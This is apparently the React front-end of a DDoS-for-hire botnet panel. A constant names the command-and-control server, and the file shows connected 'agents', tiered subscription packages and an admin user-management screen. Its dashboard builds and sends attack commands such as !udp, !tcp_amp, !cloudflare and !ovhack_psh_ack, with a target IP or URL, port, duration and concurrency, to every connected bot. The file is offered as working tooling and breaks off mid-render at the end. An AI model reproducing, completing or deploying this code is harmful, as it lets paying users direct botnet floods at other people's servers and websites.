// CDN Imports for React and ReactDOM
// These are assumed to be available globally if you're not using a bundler.
// Ensure these are included in your index.html:
// <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
// <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

// --- BEGIN: External Library - jwt-decode (Simplified for bundling) ---
// This is a minimal representation of jwt-decode's core functionality.
// In a real build, the full library would be included.
function jwtDecode(token) {
    try {
        const base64Url = token.split('.')[1];
        const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
        const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join(''));
        return JSON.parse(jsonPayload);
    } catch (e) {
        console.error("Error decoding JWT:", e);
        return {};
    }
}
// --- END: External Library - jwt-decode ---


// --- BEGIN: src/api.js ---
// IMPORTANT: CHANGE THIS URL to your actual Playit.gg web API URL or IP:PORT
const C2_API_BASE_URL = "http://YOUR_PLAYIT_WEB_API_URL_OR_IP:PORT";

const api = {
    signup: async (username, password) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/auth/signup`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        return response.json();
    },
    login: async (username, password) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        return response.json();
    },
    getProfile: async (token) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/user/profile`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        return response.json();
    },
    getBots: async (token) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/bots`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        return response.json();
    },
    // Updated sendCommand to include target in the payload
    sendCommand: async (token, command, target) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({ command, target }) // Send target along with command
        });
        return response.json();
    },
    getMetrics: async (token) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/metrics`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        return response.json();
    },
    adminGetUsers: async (token) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/admin/users`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        return response.json();
    },
    adminUpdateUser: async (token, userData) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/admin/user/update`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify(userData)
        });
        return response.json();
    },
    adminDeleteUser: async (token, username) => {
        const response = await fetch(`${C2_API_BASE_URL}/api/admin/user/delete`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
            },
            body: JSON.stringify({ username })
        });
        return response.json();
    },
};
// --- END: src/api.js ---


// --- BEGIN: src/AuthContext.js ---
const AuthContext = React.createContext(null);

const AuthProvider = ({ children }) => {
    const [user, setUser] = React.useState(null);
    const [token, setToken] = React.useState(localStorage.getItem('jwtToken'));
    const [loading, setLoading] = React.useState(true);

    React.useEffect(() => {
        const loadUser = async () => {
            if (token) {
                try {
                    // Validate token validity (e.g., expiry)
                    const decodedToken = jwtDecode(token);
                    if (decodedToken.exp * 1000 < Date.now()) {
                        console.log('Token expired.');
                        setToken(null);
                        localStorage.removeItem('jwtToken');
                        setLoading(false);
                        return;
                    }

                    const profile = await api.getProfile(token);
                    if (profile && profile.username) {
                        setUser(profile);
                    } else {
                        setToken(null);
                        localStorage.removeItem('jwtToken');
                    }
                } catch (error) {
                    console.error('Failed to fetch user profile or decode token:', error);
                    setToken(null);
                    localStorage.removeItem('jwtToken');
                }
            }
            setLoading(false);
        };
        loadUser();
    }, [token]);

    const login = async (username, password) => {
        setLoading(true);
        try {
            const data = await api.login(username, password);
            if (data.token) {
                localStorage.setItem('jwtToken', data.token);
                setToken(data.token);
                // Fetch profile immediately after setting token
                const profile = await api.getProfile(data.token);
                setUser(profile);
                return { success: true };
            } else {
                return { success: false, message: data.message || 'Login failed' };
            }
        } catch (error) {
            console.error('Login error:', error);
            return { success: false, message: error.message || 'Network error during login' };
        } finally {
            setLoading(false);
        }
    };

    const logout = () => {
        setToken(null);
        setUser(null);
        localStorage.removeItem('jwtToken');
    };

    const updateProfile = (newProfile) => {
        setUser(newProfile);
    };

    return (
        React.createElement(AuthContext.Provider, { value: { user, token, loading, login, logout, updateProfile } },
            children
        )
    );
};

const useAuth = () => React.useContext(AuthContext);
// --- END: src/AuthContext.js ---


// --- BEGIN: src/components/BackgroundDots.js ---
const BackgroundDots = () => {
    return React.createElement('div', { className: 'background-dots' });
};
// --- END: src/components/BackgroundDots.js ---


// --- BEGIN: src/Auth.js ---
const Auth = ({ onAuthSuccess }) => {
    const [isLogin, setIsLogin] = React.useState(true);
    const [username, setUsername] = React.useState('');
    const [password, setPassword] = React.useState('');
    const [message, setMessage] = React.useState('');
    const [messageType, setMessageType] = React.useState(''); // 'success' or 'error'
    const { login } = useAuth();

    const handleSubmit = async (e) => {
        e.preventDefault();
        setMessage('');
        setMessageType('');

        if (isLogin) {
            const result = await login(username, password);
            if (result.success) {
                setMessage('Login successful!');
                setMessageType('success');
                onAuthSuccess(); // Callback to App.js to navigate
            } else {
                setMessage(result.message || 'Login failed. Please check your credentials.');
                setMessageType('error');
            }
        } else {
            try {
                const data = await api.signup(username, password);
                if (data.message) {
                    setMessage(data.message);
                    setMessageType('success');
                    setIsLogin(true); // Switch to login after successful signup
                } else {
                    setMessage(data.error || 'Signup failed.');
                    setMessageType('error');
                }
            } catch (error) {
                console.error('Signup error:', error);
                setMessage(error.message || 'Network error during signup.');
                setMessageType('error');
            }
        }
    };

    return (
        React.createElement('div', { className: 'min-h-screen flex items-center justify-center p-4' },
            React.createElement('div', { className: 'card p-8 w-full max-w-md' },
                React.createElement('h2', { className: 'text-3xl font-bold text-center mb-6 text-red-400' },
                    isLogin ? 'SIGN IN' : 'SIGN UP'
                ),
                message && (
                    React.createElement('div', { className: `status-message ${messageType === 'success' ? 'status-success' : 'status-error'} mb-4 text-center` },
                        message
                    )
                ),
                React.createElement('form', { onSubmit: handleSubmit, className: 'space-y-4' },
                    React.createElement('div', null,
                        React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'USERNAME:'),
                        React.createElement('input', {
                            type: 'text',
                            className: 'input-field w-full',
                            value: username,
                            onChange: (e) => setUsername(e.target.value),
                            required: true
                        })
                    ),
                    React.createElement('div', null,
                        React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'PASSWORD:'),
                        React.createElement('input', {
                            type: 'password',
                            className: 'input-field w-full',
                            value: password,
                            onChange: (e) => setPassword(e.target.value),
                            required: true
                        })
                    ),
                    React.createElement('button', { type: 'submit', className: 'btn-primary w-full' },
                        isLogin ? 'LOGIN' : 'REGISTER'
                    )
                ),
                React.createElement('p', { className: 'text-center mt-4 text-gray-400' },
                    isLogin ? "Don't have an account?" : "Already have an account?", ' ',
                    React.createElement('button', {
                        onClick: () => setIsLogin(!isLogin),
                        className: 'text-red-400 hover:underline focus:outline-none'
                    },
                        isLogin ? 'Sign Up' : 'Sign In'
                    )
                )
            )
        )
    );
};
// --- END: src/Auth.js ---


// --- BEGIN: src/Dashboard.js ---
const Dashboard = () => {
    const { user, token, logout, updateProfile } = React.useAuth();
    const [bots, setBots] = React.useState([]);
    const [metrics, setMetrics] = React.useState(null);
    const [commandType, setCommandType] = React.useState('!udp');
    const [target, setTarget] = React.useState('');
    const [port, setPort] = React.useState('');
    const [duration, setDuration] = React.useState('');
    const [concurrent, setConcurrent] = React.useState(1); // New state for concurrent
    const [commandStatus, setCommandStatus] = React.useState({ message: '', type: '' });

    const availableCommands = {
        Noob: [], // No commands for Noob
        Normal: ['!udp', '!tcp', '!http'],
        VIP: [
            '!udp', '!tcp', '!stdhex', '!vse', '!pps', '!emptyip', '!lol', '!sybex',
            '!http', '!nfo_tcp', '!udp_bypass', '!ovhack_psh_ack', '!tcp_amp', '!custom',
            '!jsbypass', '!uambypass', '!cloudflare', '!fart', '!httprawadv'
        ]
    };

    const fetchDashboardData = async () => {
        if (!token || !user) return;
        try {
            const [botsData, metricsData, profileData] = await Promise.all([
                api.getBots(token),
                api.getMetrics(token),
                api.getProfile(token) // Fetch profile to get updated activeTasks
            ]);
            setBots(botsData.bots || []);
            setMetrics(metricsData);
            updateProfile(profileData); // Update user context with latest profile (e.g., activeTasks)
        } catch (error) {
            console.error('Error fetching dashboard data:', error);
            // Handle token expiry or network issues
            if (error.message.includes('401') || error.message.includes('Unauthorized')) {
                logout(); // Log out if token is invalid
            }
        }
    };

    React.useEffect(() => {
        fetchDashboardData();
        const interval = setInterval(fetchDashboardData, 5000); // Refresh every 5 seconds
        return () => clearInterval(interval);
    }, [token, user]); // Re-run if token or user changes

    // Update concurrent selection based on user's max concurrent limit
    React.useEffect(() => {
        if (user && user.concurrent > 0) {
            setConcurrent(1); // Default to 1 or min allowed if user has concurrent
        } else {
            setConcurrent(0); // No concurrent for Noob
        }
    }, [user]);

    const handleSendCommand = async () => {
        if (!token || !user) {
            setCommandStatus({ message: 'Not logged in.', type: 'error' });
            return;
        }

        // Client-side validation based on tier
        if (user.tier === 'Noob') {
            setCommandStatus({ message: 'ERROR: Please update your package to launch tasks.', type: 'error' });
            return;
        }
        if (bots.length === 0) {
            setCommandStatus({ message: 'ERROR: No agents connected to execute tasks.', type: 'error' });
            return;
        }
        if (!userAllowedCommands.includes(commandType)) {
            setCommandStatus({ message: `ERROR: Your '${user.tier}' package does not allow the selected task method.`, type: 'error' });
            return;
        }
        if (!target.trim()) {
            setCommandStatus({ message: 'ERROR: Target (IP/URL) cannot be empty.', type: 'error' });
            return;
        }
        if (['!udp', '!tcp', '!stdhex', '!vse', '!pps', '!lol', '!sybex', '!http', '!nfo_tcp', '!ovhack_psh_ack', '!tcp_amp', '!custom'].includes(commandType) && !port.trim()) {
             setCommandStatus({ message: 'ERROR: Port cannot be empty for this task method.', type: 'error' });
             return;
        }
        if (!duration.trim() || parseInt(duration) <= 0) {
            setCommandStatus({ message: 'ERROR: Duration must be a positive number.', type: 'error' });
            return;
        }
        if (parseInt(duration) > user.duration) {
            setCommandStatus({ message: `ERROR: Max duration for your package is ${user.duration} seconds.`, type: 'error' });
            return;
        }
        if (concurrent > user.concurrent) {
            setCommandStatus({ message: `ERROR: Max concurrent tasks for your package is ${user.concurrent}.`, type: 'error' });
            return;
        }
        if (user.activeTasks >= user.concurrent) {
            setCommandStatus({ message: `ERROR: You have ${user.activeTasks} active tasks. Max concurrent tasks for your package is ${user.concurrent}. Please wait for tasks to finish.`, type: 'error' });
            return;
        }


        // Construct the command string based on method type
        let fullCommand = '';
        if (['!jsbypass', '!uambypass', '!cloudflare', '!fart', '!httprawadv'].includes(commandType)) {
            // HTTP methods with URL and duration
            fullCommand = `${commandType} ${target} ${duration}`;
        } else if (['!emptyip', '!udp_bypass'].includes(commandType)) {
            // Methods with IP and duration
            fullCommand = `${commandType} ${target} ${duration}`;
        } else {
            // Methods with IP, Port, and duration
            fullCommand = `${commandType} ${target} ${port} ${duration}`;
        }

        setCommandStatus({ message: 'Sending command...', type: 'info' });

        // Send multiple commands for concurrent tasks
        const sendPromises = [];
        for (let i = 0; i < concurrent; i++) {
            sendPromises.push(api.sendCommand(token, fullCommand, target)); // Pass target to API call
        }

        try {
            const results = await Promise.all(sendPromises);
            const allSuccess = results.every(res => res.status === 'success');
            if (allSuccess) {
                setCommandStatus({ message: `SUCCESS: ${concurrent} task(s) launched.`, type: 'success' });
                setTarget('');
                setPort('');
                setDuration('');
                // Concurrent state will be reset by useEffect on user update
            } else {
                // Find first error message
                const firstError = results.find(res => res.status !== 'success');
                setCommandStatus({ message: `ERROR: Some tasks failed: ${firstError?.message || 'Unknown error'}`, type: 'error' });
            }
        } catch (error) {
            console.error('Error sending command:', error);
            setCommandStatus({ message: `NETWORK ERROR: ${error.message}`, type: 'error' });
        } finally {
            // Re-fetch profile to update active tasks count immediately
            const profileData = await api.getProfile(token);
            updateProfile(profileData);
        }
    };

    if (!user) {
        return React.createElement('div', { className: 'text-center text-gray-400 mt-10' }, 'LOADING USER DATA...');
    }

    const userAllowedCommands = availableCommands[user.tier] || [];
    const canLaunchTasks = user.tier !== 'Noob' && bots.length > 0;

    // Determine if Port field is needed
    const requiresPort = ['!udp', '!tcp', '!stdhex', '!vse', '!pps', '!lol', '!sybex', '!http', '!nfo_tcp', '!ovhack_psh_ack', '!tcp_amp', '!custom'].includes(commandType);
    // Determine if Target label should be IP or URL
    const targetLabel = ['!jsbypass', '!uambypass', '!cloudflare', '!fart', '!httprawadv'].includes(commandType) ? 'TARGET (URL)' : 'TARGET (IP)';


    return (
        React.createElement('div', { className: 'max-w-4xl mx-auto p-4 sm:p-8' },
            React.createElement('div', { className: 'flex justify-between items-center mb-8' },
                React.createElement('h1', { className: 'text-3xl sm:text-4xl font-bold text-red-400' }, 'DASHBOARD'),
                React.createElement('button', { onClick: logout, className: 'btn-logout' }, 'LOGOUT')
            ),

            // User Profile Card
            React.createElement('div', { className: 'card p-6 mb-8' },
                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-red-300' }, `WELCOME, ${user.username.toUpperCase()}!`),
                React.createElement('div', { className: 'grid grid-cols-1 md:grid-cols-2 gap-4 text-sm' },
                    React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'TIER:'), ' ', React.createElement('span', { className: `px-2 py-1 rounded-full text-xs font-semibold ${
                        user.tier === 'Noob' ? 'bg-gray-600 text-gray-200' :
                        user.tier === 'Normal' ? 'bg-purple-700 text-purple-100' :
                        'bg-red-700 text-red-100'
                    }` }, user.tier.toUpperCase())),
                    React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'CONCURRENT TASKS:'), ' ', user.concurrent),
                    React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'MAX DURATION:'), ' ', user.duration, ' SECONDS'),
                    React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'ACTIVE TASKS:'), ' ', user.activeTasks),
                    user.isLifetimeVIP && React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'VIP STATUS:'), ' ', React.createElement('span', { className: 'text-yellow-400' }, 'LIFETIME VIP')),
                    user.isAdmin && React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'ROLE:'), ' ', React.createElement('span', { className: 'text-purple-400' }, 'ADMINISTRATOR')),
                    React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'SIGNED UP:'), ' ', new Date(user.createdAt).toLocaleDateString()),
                    React.createElement('div', null, React.createElement('span', { className: 'font-semibold' }, 'LAST LOGIN:'), ' ', new Date(user.lastLogin).toLocaleDateString())
                )
            ),

            // Metrics Section
            React.createElement('div', { className: 'card p-6 mb-8' },
                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-red-300' }, 'PLATFORM METRICS'),
                metrics ? (
                    React.createElement('div', { className: 'grid grid-cols-1 sm:grid-cols-3 gap-4 text-center' },
                        React.createElement('div', { className: 'p-4 bg-gray-700 rounded-md' },
                            React.createElement('p', { className: 'text-xl font-bold text-green-400' }, metrics.connectedBots),
                            React.createElement('p', { className: 'text-sm text-gray-300' }, 'CONNECTED AGENTS')
                        ),
                        React.createElement('div', { className: 'p-4 bg-gray-700 rounded-md' },
                            React.createElement('p', { className: 'text-xl font-bold text-yellow-400' }, metrics.activeTasksRunning),
                            React.createElement('p', { className: 'text-sm text-gray-300' }, 'ACTIVE TASKS')
                        ),
                        React.createElement('div', { className: 'p-4 bg-gray-700 rounded-md' },
                            React.createElement('p', { className: 'text-xl font-bold text-red-400' }, metrics.registeredUsers),
                            React.createElement('p', { className: 'text-sm text-gray-300' }, 'REGISTERED USERS')
                        )
                    )
                ) : (
                    React.createElement('p', { className: 'text-gray-400' }, 'Loading metrics...')
                )
            ),

            // Bot Status Section
            React.createElement('div', { className: 'card p-6 mb-8' },
                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-red-300' }, React.createElement('span', null, 'CONNECTED AGENTS (', React.createElement('span', { id: 'bot-count' }, bots.length), ')')),
                React.createElement('div', { className: 'grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 text-sm' },
                    bots.length === 0 ? (
                        React.createElement('p', { className: 'text-gray-400' }, 'No agents currently connected.')
                    ) : (
                        bots.map(bot => (
                            React.createElement('div', { key: bot.id, className: 'card p-3 text-sm flex items-center space-x-2' },
                                React.createElement('svg', { className: 'w-5 h-5 text-green-400', fill: 'currentColor', viewBox: '0 0 20 20' },
                                    React.createElement('path', { fillRule: 'evenodd', d: 'M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z', clipRule: 'evenodd' })
                                ),
                                React.createElement('div', null,
                                    React.createElement('span', { className: 'font-semibold' }, `IP: ${bot.ip}:${bot.port}`),
                                    React.createElement('br', null),
                                    React.createElement('span', { className: 'text-gray-400' }, `OS: ${bot.os}`),
                                    React.createElement('br', null),
                                    React.createElement('span', { className: 'text-gray-400' }, `JOINED: ${bot.joinTime}`)
                                )
                            )
                        ))
                    )
                )
            ),

            // Command Sending Section
            React.createElement('div', { className: 'card p-6' },
                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-red-300' }, 'EXECUTE TASK'),
                user.tier === 'Noob' && (
                    React.createElement('div', { className: 'status-message status-error mb-4' },
                        'ERROR: Please update your package to launch tasks.'
                    )
                ),
                !canLaunchTasks && user.tier !== 'Noob' && bots.length === 0 && (
                    React.createElement('div', { className: 'status-message status-error mb-4' },
                        'ERROR: No agents connected to execute tasks.'
                    )
                ),
                userAllowedCommands.length === 0 && user.tier !== 'Noob' && (
                     React.createElement('div', { className: 'status-message status-error mb-4' },
                         'ERROR: Your current package has no allowed task methods.'
                     )
                ),

                React.createElement('div', { className: 'space-y-4', style: { opacity: (canLaunchTasks && userAllowedCommands.length > 0 && user.tier !== 'Noob') ? 1 : 0.5, pointerEvents: (canLaunchTasks && userAllowedCommands.length > 0 && user.tier !== 'Noob') ? 'auto' : 'none' } },
                    React.createElement('div', null,
                        React.createElement('label', { htmlFor: 'command-type', className: 'block text-sm font-medium text-gray-300 mb-1' }, 'TASK METHOD:'),
                        React.createElement('select', {
                            id: 'command-type',
                            className: 'input-field w-full',
                            value: commandType,
                            onChange: (e) => setCommandType(e.target.value),
                            disabled: !canLaunchTasks || userAllowedCommands.length === 0
                        },
                            userAllowedCommands.map(cmd => (
                                React.createElement('option', { key: cmd, value: cmd }, `${cmd} (${
                                    ['!jsbypass', '!uambypass', '!cloudflare', '!fart', '!httprawadv'].includes(cmd) ? 'URL Duration' :
                                    ['!emptyip', '!udp_bypass'].includes(cmd) ? 'IP Duration' :
                                    'IP Port Duration'
                                })`)
                            ))
                        )
                    ),
                    React.createElement('div', null,
                        React.createElement('label', { htmlFor: 'target', className: 'block text-sm font-medium text-gray-300 mb-1' }, targetLabel + ':'),
                        React.createElement('input', {
                            type: 'text',
                            id: 'target',
                            className: 'input-field w-full',
                            placeholder: targetLabel === 'TARGET (URL)' ? 'e.g., https://example.com' : 'e.g., 192.168.1.1',
                            value: target,
                            onChange: (e) => setTarget(e.target.value),
                            disabled: !canLaunchTasks || userAllowedCommands.length === 0
                        })
                    ),
                    requiresPort && React.createElement('div', null,
                        React.createElement('label', { htmlFor: 'port', className: 'block text-sm font-medium text-gray-300 mb-1' }, 'PORT:'),
                        React.createElement('input', {
                            type: 'number',
                            id: 'port',
                            className: 'input-field w-full',
                            placeholder: 'e.g., 80',
                            value: port,
                            onChange: (e) => setPort(e.target.value),
                            disabled: !canLaunchTasks || userAllowedCommands.length === 0
                        })
                    ),
                    React.createElement('div', null,
                        React.createElement('label', { htmlFor: 'duration', className: 'block text-sm font-medium text-gray-300 mb-1' }, 'DURATION (SECONDS):'),
                        React.createElement('input', {
                            type: 'number',
                            id: 'duration',
                            className: 'input-field w-full',
                            placeholder: `Max: ${user.duration} seconds`,
                            value: duration,
                            onChange: (e) => setDuration(e.target.value),
                            disabled: !canLaunchTasks || userAllowedCommands.length === 0
                        })
                    ),
                    React.createElement('div', null,
                        React.createElement('label', { htmlFor: 'concurrent', className: 'block text-sm font-medium text-gray-300 mb-1' }, 'CONCURRENT TASKS:'),
                        React.createElement('input', {
                            type: 'number',
                            id: 'concurrent',
                            className: 'input-field w-full',
                            placeholder: `Max: ${user.concurrent}`,
                            value: concurrent,
                            onChange: (e) => setConcurrent(Math.min(parseInt(e.target.value) || 1, user.concurrent)), // Limit input to user's max concurrent
                            min: 1,
                            max: user.concurrent,
                            disabled: !canLaunchTasks || userAllowedCommands.length === 0 || user.concurrent === 0
                        })
                    ),
                    React.createElement('button', {
                        id: 'send-command-btn',
                        className: 'btn-primary w-full',
                        onClick: handleSendCommand,
                        disabled: !canLaunchTasks || userAllowedCommands.length === 0 || user.activeTasks >= user.concurrent
                    },
                        user.activeTasks >= user.concurrent ? `MAX CONCURRENT TASKS (${user.concurrent}) REACHED` : 'SEND TASK TO ALL AGENTS'
                    ),
                    commandStatus.message && (
                        React.createElement('div', { className: `status-message ${commandStatus.type === 'success' ? 'status-success' : commandStatus.type === 'error' ? 'status-error' : 'status-info'}` },
                            commandStatus.message
                        )
                    )
                )
            )
        )
    );
};
// --- END: src/Dashboard.js ---


// --- BEGIN: src/AdminPanel.js ---
const AdminPanel = () => {
    const { token, user, logout } = React.useAuth();
    const [users, setUsers] = React.useState([]);
    const [adminMessage, setAdminMessage] = React.useState('');
    const [adminMessageType, setAdminMessageType] = React.useState(''); // 'success', 'error', 'info'

    const [showCreateForm, setShowCreateForm] = React.useState(false);
    const [newUsername, setNewUsername] = React.useState('');
    const [newPassword, setNewPassword] = React.useState('');
    const [newTier, setNewTier] = React.useState('Noob');
    const [newConcurrent, setNewConcurrent] = React.useState(0);
    const [newDuration, setNewDuration] = React.useState(0);
    const [newIsLifetimeVIP, setNewIsLifetimeVIP] = React.useState(false);
    const [newIsAdmin, setNewIsAdmin] = React.useState(false);

    const [editingUser, setEditingUser] = React.useState(null); // User object being edited

    const fetchUsers = async () => {
        if (!token || !user || !user.isAdmin) return;
        setAdminMessage('Fetching users...');
        setAdminMessageType('info');
        try {
            const data = await api.adminGetUsers(token);
            if (data.users) {
                setUsers(data.users);
                setAdminMessage('Users loaded successfully.');
                setAdminMessageType('success');
            } else {
                setAdminMessage(data.message || 'Failed to fetch users.');
                setAdminMessageType('error');
            }
        } catch (error) {
            console.error('Error fetching users:', error);
            setAdminMessage(`Network error: ${error.message}`);
            setAdminMessageType('error');
            if (error.message.includes('401') || error.message.includes('Unauthorized')) {
                logout();
            }
        }
    };

    React.useEffect(() => {
        fetchUsers();
        const interval = setInterval(fetchUsers, 10000); // Refresh users every 10 seconds
        return () => clearInterval(interval);
    }, [token, user]);

    const handleCreateUser = async (e) => {
        e.preventDefault();
        setAdminMessage('Creating user...');
        setAdminMessageType('info');
        try {
            // First, sign up the user (creates basic account)
            const signupResult = await api.signup(newUsername, newPassword);
            if (signupResult.error) {
                setAdminMessage(`Signup failed: ${signupResult.error}`);
                setAdminMessageType('error');
                return;
            }

            // Then, update their profile with tier/concurrent/duration/admin status
            const updateResult = await api.adminUpdateUser(token, {
                username: newUsername,
                tier: newTier,
                concurrent: newConcurrent,
                duration: newDuration,
                isLifetimeVIP: newIsLifetimeVIP,
                isAdmin: newIsAdmin
            });

            if (updateResult.status === 'success') {
                setAdminMessage(`User "${newUsername}" created and updated successfully!`);
                setAdminMessageType('success');
                setNewUsername('');
                setNewPassword('');
                setNewTier('Noob');
                setNewConcurrent(0);
                setNewDuration(0);
                setNewIsLifetimeVIP(false);
                setNewIsAdmin(false);
                setShowCreateForm(false);
                fetchUsers(); // Refresh user list
            } else {
                setAdminMessage(`Failed to update user details after signup: ${updateResult.message || 'Unknown error'}`);
                setAdminMessageType('error');
            }
        } catch (error) {
            console.error('Error creating user:', error);
            setAdminMessage(`Network error during user creation: ${error.message}`);
            setAdminMessageType('error');
        }
    };

    const handleUpdateUser = async (userData) => {
        setAdminMessage(`Updating user "${userData.username}"...`);
        setAdminMessageType('info');
        try {
            const result = await api.adminUpdateUser(token, userData);
            if (result.status === 'success') {
                setAdminMessage(`User "${userData.username}" updated successfully!`);
                setAdminMessageType('success');
                setEditingUser(null); // Exit edit mode
                fetchUsers(); // Refresh user list
            } else {
                setAdminMessage(`Failed to update user "${userData.username}": ${result.message || 'Unknown error'}`);
                setAdminMessageType('error');
            }
        } catch (error) {
            console.error('Error updating user:', error);
            setAdminMessage(`Network error during user update: ${error.message}`);
            setAdminMessageType('error');
        }
    };

    const handleDeleteUser = async (usernameToDelete) => {
        if (!confirm(`Are you sure you want to delete user "${usernameToDelete}"? This action cannot be undone.`)) {
            return;
        }
        setAdminMessage(`Deleting user "${usernameToDelete}"...`);
        setAdminMessageType('info');
        try {
            const result = await api.adminDeleteUser(token, usernameToDelete);
            if (result.status === 'success') {
                setAdminMessage(`User "${usernameToDelete}" deleted successfully.`);
                setAdminMessageType('success');
                fetchUsers(); // Refresh user list
            } else {
                setAdminMessage(`Failed to delete user "${usernameToDelete}": ${result.message || 'Unknown error'}`);
                setAdminMessageType('error');
            }
        } catch (error) {
            console.error('Error deleting user:', error);
            setAdminMessage(`Network error during user deletion: ${error.message}`);
            setAdminMessageType('error');
        }
    };

    if (!user || !user.isAdmin) {
        return React.createElement('div', { className: 'text-center text-gray-400 mt-10' }, 'ACCESS DENIED: ADMIN PRIVILEGES REQUIRED.');
    }

    return (
        React.createElement('div', { className: 'max-w-6xl mx-auto p-4 sm:p-8' },
            React.createElement('div', { className: 'flex justify-between items-center mb-8' },
                React.createElement('h1', { className: 'text-3xl sm:text-4xl font-bold text-purple-400' }, 'ADMIN PANEL'),
                React.createElement('button', { onClick: logout, className: 'btn-logout' }, 'LOGOUT')
            ),

            adminMessage && (
                React.createElement('div', { className: `status-message ${adminMessageType === 'success' ? 'status-success' : adminMessageType === 'error' ? 'status-error' : 'status-info'} mb-4` },
                    adminMessage
                )
            ),

            // Create New User Section
            React.createElement('div', { className: 'card p-6 mb-8' },
                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-purple-300' }, 'CREATE NEW USER'),
                React.createElement('button', {
                    onClick: () => setShowCreateForm(!showCreateForm),
                    className: 'btn-primary mb-4'
                }, showCreateForm ? 'HIDE FORM' : 'SHOW FORM'),

                showCreateForm && (
                    React.createElement('form', { onSubmit: handleCreateUser, className: 'space-y-4 mt-4' },
                        React.createElement('div', null,
                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'USERNAME:'),
                            React.createElement('input', {
                                type: 'text',
                                className: 'input-field w-full',
                                value: newUsername,
                                onChange: (e) => setNewUsername(e.target.value),
                                required: true
                            })
                        ),
                        React.createElement('div', null,
                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'PASSWORD:'),
                            React.createElement('input', {
                                type: 'password',
                                className: 'input-field w-full',
                                value: newPassword,
                                onChange: (e) => setNewPassword(e.target.value),
                                required: true
                            })
                        ),
                        React.createElement('div', null,
                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'TIER:'),
                            React.createElement('select', {
                                className: 'input-field w-full',
                                value: newTier,
                                onChange: (e) => setNewTier(e.target.value)
                            },
                                React.createElement('option', { value: 'Noob' }, 'Noob'),
                                React.createElement('option', { value: 'Normal' }, 'Normal'),
                                React.createElement('option', { value: 'VIP' }, 'VIP')
                            )
                        ),
                        React.createElement('div', null,
                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'MAX CONCURRENT TASKS:'),
                            React.createElement('input', {
                                type: 'number',
                                className: 'input-field w-full',
                                value: newConcurrent,
                                onChange: (e) => setNewConcurrent(parseInt(e.target.value) || 0),
                                min: 0
                            })
                        ),
                        React.createElement('div', null,
                            React.createElement('label', { className: 'block text-sm font-medium text-gray-300 mb-1' }, 'MAX DURATION (SECONDS):'),
                            React.createElement('input', {
                                type: 'number',
                                className: 'input-field w-full',
                                value: newDuration,
                                onChange: (e) => setNewDuration(parseInt(e.target.value) || 0),
                                min: 0
                            })
                        ),
                        React.createElement('div', { className: 'flex items-center space-x-2' },
                            React.createElement('input', {
                                type: 'checkbox',
                                id: 'newIsLifetimeVIP',
                                className: 'form-checkbox',
                                checked: newIsLifetimeVIP,
                                onChange: (e) => setNewIsLifetimeVIP(e.target.checked)
                            }),
                            React.createElement('label', { htmlFor: 'newIsLifetimeVIP', className: 'text-sm font-medium text-gray-300' }, 'LIFETIME VIP')
                        ),
                        React.createElement('div', { className: 'flex items-center space-x-2' },
                            React.createElement('input', {
                                type: 'checkbox',
                                id: 'newIsAdmin',
                                className: 'form-checkbox',
                                checked: newIsAdmin,
                                onChange: (e) => setNewIsAdmin(e.target.checked)
                            }),
                            React.createElement('label', { htmlFor: 'newIsAdmin', className: 'text-sm font-medium text-gray-300' }, 'ADMIN USER')
                        ),
                        React.createElement('button', { type: 'submit', className: 'btn-primary w-full' }, 'CREATE USER')
                    )
                )
            ),

            // User List Section
            React.createElement('div', { className: 'card p-6' },
                React.createElement('h2', { className: 'text-2xl font-semibold mb-4 text-purple-300' }, 'MANAGE USERS'),
                users.length === 0 ? (
                    React.createElement('p', { className: 'text-gray-400' }, 'No users found.')
                ) : (
                    React.createElement('div', { className: 'overflow-x-auto' },
